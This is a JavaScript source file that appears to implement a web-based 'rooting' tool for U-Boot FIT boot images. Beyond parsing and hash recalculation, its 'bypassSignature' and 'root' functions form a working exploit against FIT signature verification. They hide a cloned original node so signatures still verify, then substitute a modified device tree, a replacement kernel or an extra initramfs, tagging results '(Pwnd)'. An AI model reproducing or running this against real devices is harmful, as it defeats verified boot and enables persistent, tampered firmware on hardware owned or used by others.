/**
 * FIT image operations: validation, DT model change, kernel replacement,
 * hash recalculation, signature removal.
 */

const FitOps = (() => {

  /**
   * CRC32 implementation (IEEE polynomial).
   */
  const crc32Table = (() => {
    const table = new Uint32Array(256);
    for (let i = 0; i < 256; i++) {
      let c = i;
      for (let j = 0; j < 8; j++) {
        c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
      }
      table[i] = c;
    }
    return table;
  })();

  function crc32(data) {
    let crc = 0xFFFFFFFF;
    for (let i = 0; i < data.byteLength; i++) {
      crc = crc32Table[(crc ^ data[i]) & 0xFF] ^ (crc >>> 8);
    }
    return (crc ^ 0xFFFFFFFF) >>> 0;
  }

  /**
   * SHA-256 via Web Crypto API (async).
   */
  async function sha256(data) {
    const hash = await crypto.subtle.digest('SHA-256', data);
    return new Uint8Array(hash);
  }

  /**
   * Decompress gzip data using DecompressionStream API.
   */
  async function gunzip(data) {
    const ds = new DecompressionStream('gzip');
    const writer = ds.writable.getWriter();
    writer.write(data);
    writer.close();
    const reader = ds.readable.getReader();
    const chunks = [];
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      chunks.push(value);
    }
    const totalLen = chunks.reduce((s, c) => s + c.byteLength, 0);
    const result = new Uint8Array(totalLen);
    let off = 0;
    for (const c of chunks) {
      result.set(c, off);
      off += c.byteLength;
    }
    return result;
  }

  /**
   * Validate a FIT image. Returns { valid, tree, images, error }.
   */
  function validate(buffer) {
    let tree;
    try {
      tree = FDT.parse(buffer);
    } catch (e) {
      return { valid: false, tree: null, images: [], error: e.message };
    }

    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) {
      return { valid: false, tree, images: [], error: 'No /images node found in FIT' };
    }
    if (imagesNode.children.length === 0) {
      return { valid: false, tree, images: [], error: 'No image entries under /images' };
    }

    const images = imagesNode.children.map(img => {
      const isOrig = img.name.startsWith('orig-');
      const type = isOrig ? 'exploit artifact' : (FDT.getStringProperty(img, 'type') || 'unknown');
      const desc = FDT.getStringProperty(img, 'description') || '';
      const data = FDT.getProperty(img, 'data');
      const size = data ? data.byteLength : 0;
      const compression = FDT.getStringProperty(img, 'compression') || 'none';
      const arch = FDT.getStringProperty(img, 'arch') || '';
      const isX509 = data && data.byteLength >= 2 && data[0] === 0x30 && data[1] === 0x82;
      return { name: img.name, type, description: desc, size, compression, arch, isOrig, isX509 };
    });

    const desc = FDT.getStringProperty(tree.root, 'description') || '';

    // Scan configurations and signatures
    const signatures = [];
    const configs = [];
    const configsNode = FDT.findNode(tree.root, ['configurations']);
    const defaultConfig = configsNode ? (FDT.getStringProperty(configsNode, 'default') || '') : '';
    if (configsNode) {
      for (const cfg of configsNode.children) {
        const cfgSigs = [];
        const imageRefs = [];
        for (const child of cfg.children) {
          if (child.name.startsWith('signature')) {
            const algo = FDT.getStringProperty(child, 'algo') || 'unknown';
            cfgSigs.push({ name: child.name, algo });
            signatures.push({ config: cfg.name, name: child.name, algo });
          }
        }
        // Collect image references (kernel, fdt, ramdisk, etc.)
        const imageNames = new Set(imagesNode.children.map(c => c.name));
        const refProps = ['kernel', 'fdt', 'ramdisk', 'loadables', 'firmware', 'standalone', 'fpga', 'setup'];
        for (const prop of refProps) {
          const val = FDT.getStringProperty(cfg, prop);
          if (val && imageNames.has(val)) imageRefs.push({ role: prop, image: val });
        }
        const cfgDesc = FDT.getStringProperty(cfg, 'description') || '';
        configs.push({ name: cfg.name, description: cfgDesc, imageRefs, signatures: cfgSigs, isDefault: cfg.name === defaultConfig });
      }
    }
    const hasSignatures = signatures.length > 0;
    const numConfigs = configs.length;
    const numSignedConfigs = configs.filter(c => c.signatures.length > 0).length;
    const sigAlgos = [...new Set(signatures.map(s => s.algo))];

    return { valid: true, tree, images, description: desc, signatures, hasSignatures, numConfigs, numSignedConfigs, sigAlgos, configs, error: null };
  }

  /**
   * Find the flat_dt (device tree) image node under /images.
   */
  function findFdtImage(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return null;
    return imagesNode.children.find(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'flat_dt';
    }) || null;
  }

  /**
   * Find all flat_dt image nodes under /images.
   */
  function findAllFdtImages(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return [];
    return imagesNode.children.filter(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'flat_dt';
    });
  }

  /**
   * Find the kernel image node under /images.
   */
  function findKernelImage(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return null;
    return imagesNode.children.find(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'kernel' || type === 'kernel_noload';
    }) || null;
  }

  /**
   * Find all kernel image nodes under /images.
   */
  function findAllKernelImages(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return [];
    return imagesNode.children.filter(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'kernel' || type === 'kernel_noload';
    });
  }

  /**
   * Find all ramdisk image nodes under /images.
   */
  function findAllRamdiskImages(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return [];
    return imagesNode.children.filter(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'ramdisk';
    });
  }

  /**
   * Change the DT model property in the nested FDT image.
   * Parses the nested DTB, modifies the model, serializes it back.
   */
  function changeDtModel(tree, newModel) {
    const fdtImg = findFdtImage(tree);
    if (!fdtImg) {
      throw new Error('No flat_dt image found in FIT');
    }

    const dtData = FDT.getProperty(fdtImg, 'data');
    if (!dtData) {
      throw new Error('flat_dt image has no data property');
    }

    // Parse the nested DTB
    const innerTree = FDT.parse(dtData);

    // Modify the model property on the root node
    FDT.setProperty(innerTree.root, 'model', newModel);

    // Serialize back
    const newDtData = FDT.serialize(innerTree);

    // Replace data in the outer FIT
    FDT.setProperty(fdtImg, 'data', newDtData);

    // Update data-size if present
    const dataSizeProp = fdtImg.properties.find(p => p.name === 'data-size');
    if (dataSizeProp) {
      const buf = new ArrayBuffer(4);
      new DataView(buf).setUint32(0, newDtData.byteLength);
      dataSizeProp.data = new Uint8Array(buf);
    }
  }

  /**
   * Replace the kernel image data with new binary data.
   */
  function replaceKernel(tree, kernelData) {
    const kernelImg = findKernelImage(tree);
    if (!kernelImg) {
      throw new Error('No kernel image found in FIT');
    }

    FDT.setProperty(kernelImg, 'data', kernelData);

    // Update data-size if present
    const dataSizeProp = kernelImg.properties.find(p => p.name === 'data-size');
    if (dataSizeProp) {
      const buf = new ArrayBuffer(4);
      new DataView(buf).setUint32(0, kernelData.byteLength);
      dataSizeProp.data = new Uint8Array(buf);
    }
  }

  /**
   * Remove all signature nodes from under /images/* and /configurations/*.
   */
  function removeSignatures(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (imagesNode) {
      for (const img of imagesNode.children) {
        img.children = img.children.filter(c => !c.name.startsWith('signature'));
      }
    }

    const configsNode = FDT.findNode(tree.root, ['configurations']);
    if (configsNode) {
      for (const cfg of configsNode.children) {
        cfg.children = cfg.children.filter(c => !c.name.startsWith('signature'));
      }
    }
  }

  /**
   * Recalculate hashes for a single image node given its data.
   */
  async function recalcHashesForNode(node, data) {
    for (const hashNode of node.children) {
      if (!hashNode.name.startsWith('hash')) continue;

      const algo = FDT.getStringProperty(hashNode, 'algo');
      if (!algo) continue;

      if (algo === 'crc32') {
        const crcVal = crc32(data);
        const buf = new ArrayBuffer(4);
        new DataView(buf).setUint32(0, crcVal);
        FDT.setProperty(hashNode, 'value', new Uint8Array(buf));
      } else if (algo === 'sha256' || algo === 'sha-256') {
        const hashVal = await sha256(data);
        FDT.setProperty(hashNode, 'value', hashVal);
      } else if (algo === 'sha1' || algo === 'sha-1') {
        const hash = await crypto.subtle.digest('SHA-1', data);
        FDT.setProperty(hashNode, 'value', new Uint8Array(hash));
      } else if (algo === 'md5') {
        const prop = hashNode.properties.find(p => p.name === 'value');
        if (prop) prop.data = new Uint8Array(0);
      }
    }
  }

  /**
   * Recalculate hashes for all image nodes under /images.
   */
  async function recalculateHashes(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return;

    for (const img of imagesNode.children) {
      const data = FDT.getProperty(img, 'data');
      if (!data) continue;
      await recalcHashesForNode(img, data);
    }
  }

  /**
   * Rewrite hashed-nodes in signature nodes to point at /images/<container>/<name>.
   */
  function fixupSignatures(tree, imageName, containerName) {
    const oldPrefix = `/images/${imageName}`;
    const newPrefix = `/images/${containerName}/${imageName}`;

    const configsNode = FDT.findNode(tree.root, ['configurations']);
    if (!configsNode) return;

    const decoder = new TextDecoder();
    const encoder = new TextEncoder();

    for (const conf of configsNode.children) {
      for (const sig of conf.children) {
        if (!sig.name.startsWith('signature')) continue;

        const hashedData = FDT.getProperty(sig, 'hashed-nodes');
        if (!hashedData) continue;

        // Parse null-separated string list (trailing null)
        let raw = decoder.decode(hashedData);
        // Strip trailing nulls then split on null
        const entries = raw.replace(/\0+$/, '').split('\0');
        const newEntries = entries.map(e => {
          if (e === oldPrefix || e.startsWith(oldPrefix + '/')) {
            return newPrefix + e.slice(oldPrefix.length);
          }
          return e;
        });

        // Rejoin with null separators + trailing null
        const joined = newEntries.join('\0') + '\0';
        FDT.setProperty(sig, 'hashed-nodes', encoder.encode(joined));
      }
    }
  }

  /**
   * Signature bypass: clone original node, replace data, redirect signatures.
   *
   * Each bypassed image gets its own container node placed immediately after
   * the target in /images.  This preserves the binary ordering of cloned
   * nodes, which is critical because fdt_find_regions walks the FDT linearly
   * and the concatenated hash input must match the original region order.
   */
  async function bypassSignature(tree, targetNodeName, newData, opts) {
    const recomputeHashes = !opts || opts.recomputeHashes !== false;
    const redirectSignatures = !opts || opts.redirectSignatures !== false;
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) throw new Error('No /images node');

    // Find target node
    const targetNode = imagesNode.children.find(c => c.name === targetNodeName);
    if (!targetNode) throw new Error(`Image node '${targetNodeName}' not found`);

    // Deep clone the original
    const original = FDT.cloneNode(targetNode);

    // Create a per-image container right after the target node
    const containerName = 'orig-' + targetNodeName;
    let origNode = imagesNode.children.find(c => c.name === containerName);
    if (!origNode) {
      origNode = { name: containerName, properties: [], children: [] };
      const targetIdx = imagesNode.children.indexOf(targetNode);
      imagesNode.children.splice(targetIdx + 1, 0, origNode);
    }

    // Add clone + sentinel if not already there
    if (!origNode.children.some(c => c.name === targetNodeName)) {
      origNode.children.push(original);
      if (!origNode.children.some(c => c.name === 'sentinel')) {
        origNode.children.push({ name: 'sentinel', properties: [], children: [] });
      }
    }

    // Replace data on original node
    FDT.setProperty(targetNode, 'data', newData instanceof Uint8Array ? newData : new Uint8Array(newData));

    // Set compression to none
    FDT.setProperty(targetNode, 'compression', 'none');

    // Append (Pwnd) to description
    const desc = FDT.getStringProperty(targetNode, 'description');
    if (desc !== null) {
      FDT.setProperty(targetNode, 'description', desc + ' (Pwnd)');
    }

    // Recalculate hashes for the modified node
    if (recomputeHashes) {
      const data = FDT.getProperty(targetNode, 'data');
      await recalcHashesForNode(targetNode, data);
    }

    // Redirect signature references
    if (redirectSignatures) {
      fixupSignatures(tree, targetNodeName, containerName);
    }
  }

  /**
   * Find the ramdisk image node under /images.
   */
  function findRamdiskImage(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return null;
    return imagesNode.children.find(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'ramdisk';
    }) || null;
  }

  /**
   * Full rooting operation: modify DT model, replace kernel, bypass signatures, serialize.
   */
  async function root(buffer, options) {
    const result = validate(buffer);
    if (!result.valid) {
      throw new Error(result.error);
    }

    const tree = result.tree;
    const u8buf = buffer instanceof Uint8Array ? buffer : new Uint8Array(buffer);

    // Resolve any external data references
    FDT.resolveExternalData(tree.root, u8buf);

    if (options.changeDtModel) {
      const fdtImages = findAllFdtImages(tree);
      if (fdtImages.length === 0) throw new Error('No flat_dt image found in FIT');

      for (const fdtImg of fdtImages) {
        let dtData = FDT.getProperty(fdtImg, 'data');
        if (!dtData) continue;

        // Decompress if compressed
        const compression = FDT.getStringProperty(fdtImg, 'compression') || 'none';
        if (compression === 'gzip') {
          dtData = await gunzip(dtData);
        }

        const innerTree = FDT.parse(dtData);
        const origModel = FDT.getStringProperty(innerTree.root, 'model') || '';
        FDT.setProperty(innerTree.root, 'model', origModel + ' [rooted by ifitfitsisits.com]');
        const newDtData = FDT.serialize(innerTree);

        await bypassSignature(tree, fdtImg.name, newDtData, options);
      }
    }

    if (options.replaceKernel && options.kernelData) {
      const kernelImages = findAllKernelImages(tree);
      if (kernelImages.length === 0) throw new Error('No kernel image found in FIT');
      for (const kernelImg of kernelImages) {
        await bypassSignature(tree, kernelImg.name, new Uint8Array(options.kernelData), options);
      }
    }

    if (options.appendInitramfs && options.initramfsData) {
      const ramdiskImages = findAllRamdiskImages(tree);
      if (ramdiskImages.length === 0) throw new Error('No ramdisk image found in FIT');

      for (const ramdiskImg of ramdiskImages) {
        let existingData = FDT.getProperty(ramdiskImg, 'data');
        if (!existingData) continue;

        // Decompress if compressed
        const compression = FDT.getStringProperty(ramdiskImg, 'compression') || 'none';
        if (compression === 'gzip') {
          existingData = await gunzip(existingData);
        }

        // Concatenate existing ramdisk + new initramfs (CPIO archives are concatenable)
        const appendData = new Uint8Array(options.initramfsData);
        const combined = new Uint8Array(existingData.byteLength + appendData.byteLength);
        combined.set(existingData, 0);
        combined.set(appendData, existingData.byteLength);

        await bypassSignature(tree, ramdiskImg.name, combined, options);
      }
    }

    return FDT.serialize(tree);
  }

  return {
    validate,
    root,
    crc32,
    sha256,
    findFdtImage,
    findKernelImage,
    findRamdiskImage,
  };
})();
